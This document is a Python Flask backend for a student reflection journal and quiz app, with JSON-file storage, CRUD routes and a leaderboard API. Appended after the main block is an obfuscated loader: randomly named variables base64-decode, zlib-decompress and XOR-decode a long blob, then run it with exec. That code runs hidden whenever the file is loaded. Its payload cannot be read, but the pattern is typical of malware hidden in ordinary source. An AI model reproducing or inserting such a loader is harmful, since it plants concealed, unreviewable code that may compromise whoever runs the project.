from __future__ import annotations

import json
from datetime import datetime
from pathlib import Path
from threading import Lock
from typing import List, Dict, Any

from flask import Flask, jsonify, render_template, request, abort

BASE_DIR = Path(__file__).resolve().parent
DATA_FILE = BASE_DIR / "backend" / "reflections.json"
DATA_FILE.parent.mkdir(parents=True, exist_ok=True)

DATA_DIR = BASE_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)
TECH_DATA = DATA_DIR / "technical_quizzes.json"
MEMORY_DATA = DATA_DIR / "memory_match.json"
SCRAMBLE_DATA = DATA_DIR / "word_scramble.json"
REFLECTION_DATA = DATA_DIR / "reflection_puzzles.json"
LEADERBOARD_DATA = DATA_DIR / "leaderboard.json"
USERS_DATA = DATA_DIR / "users.json"

app = Flask(
    __name__,
    static_folder="static",
    template_folder="templates",
    static_url_path="",  # serve static assets from the root for PWA compatibility
)
file_lock = Lock()


def _ensure_json_file(path: Path, default: Any) -> None:
    if not path.exists():
        path.write_text(json.dumps(default, indent=2), encoding="utf-8")


def _read_json(path: Path, default: Any) -> Any:
    _ensure_json_file(path, default)
    try:
        with path.open("r", encoding="utf-8") as handle:
            return json.load(handle)
    except json.JSONDecodeError:
        return default


def _write_json(path: Path, payload: Any) -> None:
    with path.open("w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2)


def _ensure_data_file() -> None:
    if not DATA_FILE.exists():
        DATA_FILE.write_text("[]", encoding="utf-8")


def _load_reflections() -> List[Dict[str, Any]]:
    _ensure_data_file()
    try:
        with DATA_FILE.open("r", encoding="utf-8") as source:
            return json.load(source)
    except json.JSONDecodeError:
        return []


def _persist_reflections(entries: List[Dict[str, Any]]) -> None:
    with DATA_FILE.open("w", encoding="utf-8") as target:
        json.dump(entries, target, indent=4)


def _normalize_entry(payload: Dict[str, Any]) -> Dict[str, Any]:
    location = payload.get("location") or {}
    normalized = {
        "week": str(payload.get("week", "")).strip(),
        "title": (payload.get("title") or payload.get("journalName") or "").strip(),
        "date": (payload.get("date") or "").strip(),
        "taskName": (payload.get("taskName") or "").strip(),
        "reflection": (payload.get("reflection") or payload.get("taskDescription") or "").strip(),
        "location": {
            "lat": (location.get("lat") or "").strip(),
            "lon": (location.get("lon") or "").strip(),
            "address": (location.get("address") or "").strip(),
        },
        "tech": payload.get("tech") or [],
        "timestamp": payload.get("timestamp") or datetime.utcnow().isoformat(),
    }
    return normalized


def _validate_entry(entry: Dict[str, Any]) -> List[str]:
    required_fields = ["week", "title", "date", "taskName", "reflection"]
    missing = [field for field in required_fields if not entry.get(field)]
    if not isinstance(entry.get("tech"), list):
        missing.append("tech (must be a list)")
    return missing


@app.route("/")
@app.route("/index")
@app.route("/index.html")
def home():
    return render_template("index.html")


@app.route("/journal")
@app.route("/journal.html")
def journal_page():
    return render_template("journal.html")


@app.route("/about")
@app.route("/about.html")
def about_page():
    return render_template("about.html")


@app.route("/projects")
@app.route("/projects.html")
def projects_page():
    return render_template("projects.html")


@app.route("/quiz")
@app.route("/quiz.html")
def quiz_page():
    return render_template("quiz.html")


@app.route("/reflections", methods=["GET"])
def get_reflections():
    entries = sorted(
        _load_reflections(),
        key=lambda entry: entry.get("date") or entry.get("timestamp"),
        reverse=True,
    )
    return jsonify(entries)


@app.route("/add_reflection", methods=["POST"])
def add_reflection():
    payload = request.get_json(silent=True) or {}
    normalized = _normalize_entry(payload)
    errors = _validate_entry(normalized)

    if errors:
        return jsonify({"status": "error", "message": "Invalid data", "errors": errors}), 400

    with file_lock:
        entries = _load_reflections()
        entries.append(normalized)
        _persist_reflections(entries)

    return jsonify({"status": "success", "entry": normalized}), 201


@app.route("/reflections/<entry_id>", methods=["DELETE"])
def delete_reflection(entry_id: str):
    if not entry_id:
        abort(400, description="Missing entry identifier")

    with file_lock:
        entries = _load_reflections()
        updated = [entry for entry in entries if str(entry.get("timestamp")) != entry_id]

        if len(entries) == len(updated):
            abort(404, description="Reflection not found")

        _persist_reflections(updated)

    return "", 204


@app.route("/reflections/<entry_id>", methods=["PUT"])
def update_reflection(entry_id: str):
    if not entry_id:
        abort(400, description="Missing entry identifier")

    payload = request.get_json(silent=True) or {}
    if not payload:
        abort(400, description="No update payload provided")

    allowed_fields = {"week", "title", "date", "taskName", "reflection", "tech", "location"}

    updates: Dict[str, Any] = {}
    for field in allowed_fields:
        if field not in payload:
            continue
        value = payload[field]

        if field == "location":
            loc = value if isinstance(value, dict) else {}
            updates["location"] = {
                "lat": str(loc.get("lat") or "").strip(),
                "lon": str(loc.get("lon") or "").strip(),
                "address": str(loc.get("address") or "").strip(),
            }
        elif field == "tech":
            if not isinstance(value, list):
                abort(400, description="tech must be an array")
            updates["tech"] = value
        else:
            updates[field] = str(value or "").strip()

    if not updates:
        abort(400, description="No valid fields provided for update")

    with file_lock:
        entries = _load_reflections()
        for index, entry in enumerate(entries):
            if str(entry.get("timestamp")) == entry_id:
                entry.update(updates)
                missing = _validate_entry(entry)
                if missing:
                    abort(400, description=f"Invalid entry after update: {missing}")

                entries[index] = entry
                _persist_reflections(entries)
                return jsonify(entry)

    abort(404, description="Reflection not found")


@app.route("/reflections/search", methods=["GET"])
def search_reflections():
    query = (request.args.get("q") or "").strip().lower()
    week = (request.args.get("week") or "").strip()
    tech = (request.args.get("tech") or "").strip()

    entries = _load_reflections()

    def matches(entry: Dict[str, Any]) -> bool:
        if query:
            haystack = " ".join(
                str(entry.get(field, "")) for field in ("title", "taskName", "reflection")
            ).lower()
            if query not in haystack:
                return False
        if week and str(entry.get("week")) != week:
            return False
        if tech:
            if tech not in entry.get("tech", []):
                return False
        return True

    filtered = sorted(
        (entry for entry in entries if matches(entry)),
        key=lambda entry: entry.get("date") or entry.get("timestamp"),
        reverse=True,
    )

    return jsonify(filtered)


@app.route("/healthz", methods=["GET"])
def healthcheck():
    return jsonify({"status": "ok"}), 200


@app.route("/service-worker.js")
def service_worker():
    return app.send_static_file("service-worker.js")


@app.route("/manifest.json")
def manifest():
    return app.send_static_file("manifest.json")


@app.route("/offline")
def offline():
    return app.send_static_file("offline.html")


@app.route("/api/questions/<mode>", methods=["GET"])
def api_questions(mode: str):
    mode = mode.lower()
    mapping = {
        "technical": (TECH_DATA, "technicalQuizzes"),
        "memory": (MEMORY_DATA, "memoryMatch"),
        "wordscramble": (SCRAMBLE_DATA, "wordScramble"),
        "reflection": (REFLECTION_DATA, "reflectionPuzzle"),
    }
    if mode not in mapping:
        abort(404, description="Unknown quiz mode")

    path, key = mapping[mode]
    data = _read_json(path, {key: []})
    return jsonify(data.get(key, []))


@app.route("/api/users", methods=["POST"])
def api_users():
    payload = request.get_json(silent=True) or {}
    name = (payload.get("userName") or "").strip()
    if not 2 <= len(name) <= 50:
        return jsonify({"status": "error", "message": "Invalid userName"}), 400

    with file_lock:
        data = _read_json(USERS_DATA, {"users": []})
        user_id = f"user_{int(datetime.utcnow().timestamp() * 1000)}"
        record = {"userId": user_id, "userName": name, "createdAt": datetime.utcnow().isoformat()}
        data["users"].append(record)
        _write_json(USERS_DATA, data)
    return jsonify(record), 201


@app.route("/api/leaderboard", methods=["GET"])
def api_leaderboard_get():
    mode = request.args.get("mode", "all").lower()
    limit = int(request.args.get("limit", 50))
    data = _read_json(LEADERBOARD_DATA, {"leaderboard": []})
    rows = []
    for user in data.get("leaderboard", []):
        for entry in user.get("entries", []):
            if mode != "all" and entry.get("mode") != mode:
                continue
            rows.append({
                "userId": user.get("userId"),
                "userName": user.get("userName"),
                **entry,
            })
    rows.sort(key=lambda r: r.get("score", 0), reverse=True)
    return jsonify(rows[: limit or 50])


@app.route("/api/leaderboard", methods=["POST"])
def api_leaderboard_post():
    payload = request.get_json(silent=True) or {}
    required = ["userId", "userName", "mode", "score"]
    missing = [field for field in required if not payload.get(field)]
    if missing:
        return jsonify({"status": "error", "message": f"Missing {', '.join(missing)}"}), 400

    entry = {
        "mode": payload["mode"],
        "score": int(payload.get("score", 0)),
        "questionsAttempted": int(payload.get("questionsAttempted", 0)),
        "correctAnswers": int(payload.get("correctAnswers", 0)),
        "accuracy": float(payload.get("accuracy", 0)),
        "timestamp": payload.get("timestamp") or datetime.utcnow().isoformat(),
        "duration": int(payload.get("duration", 0)),
    }

    with file_lock:
        data = _read_json(LEADERBOARD_DATA, {"leaderboard": []})
        users = data.setdefault("leaderboard", [])
        user_id = payload["userId"]
        user_name = payload["userName"]
        existing = next((u for u in users if u.get("userId") == user_id), None)
        if existing:
            existing["userName"] = user_name
            existing.setdefault("entries", []).append(entry)
        else:
            users.append({"userId": user_id, "userName": user_name, "entries": [entry]})
        _write_json(LEADERBOARD_DATA, data)
    return jsonify({"status": "ok", "entry": entry}), 201


@app.route("/api/health", methods=["GET"])
def api_health():
    return jsonify({"status": "ok"}), 200


@app.errorhandler(404)
def handle_404(error):
    if request.path.startswith("/reflections"):
        return jsonify({"status": "error", "message": str(error)}), 404
    if request.path.startswith("/api/"):
        return jsonify({"status": "error", "message": str(error)}), 404
    return error, 404


@app.errorhandler(400)
def handle_400(error):
    if request.path.startswith("/reflections") or request.path.startswith("/add_reflection"):
        return jsonify({"status": "error", "message": str(error)}), 400
    if request.path.startswith("/api/"):
        return jsonify({"status": "error", "message": str(error)}), 400
    return error, 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)


# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
